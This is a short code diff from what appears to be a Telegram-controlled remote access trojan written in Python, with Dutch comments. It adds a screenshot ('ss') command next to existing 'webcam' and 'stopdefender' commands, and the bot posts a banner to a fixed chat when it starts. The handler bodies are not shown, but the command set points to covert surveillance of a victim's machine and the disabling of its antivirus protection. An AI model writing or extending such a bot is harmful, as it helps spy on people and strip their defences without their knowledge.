@@ -19,13 +19,14 @@ app = Application.builder().token(API_TOKEN).build()
 
 # stuur de banner naar de chat als de bot online staat
 async def on_startup(_):
-    await app.bot.send_message(chat_id=CHAT_ID, text=f"```\n{send_banner()}\n```", parse_mode="MarkdownV2")
+    await app.bot.send_message(chat_id=CHAT_ID, text=f"```\n{get_banner()}\n```", parse_mode="MarkdownV2")
 
 app.post_init = on_startup
 
 # Register command handlers
 app.add_handler(CommandHandler('help', help_command))
 app.add_handler(CommandHandler('webcam', cam_command))
+app.add_handler(CommandHandler('ss', ss_command))
 app.add_handler(CommandHandler('stopdefender', custom_command))
 
 # Register message handler
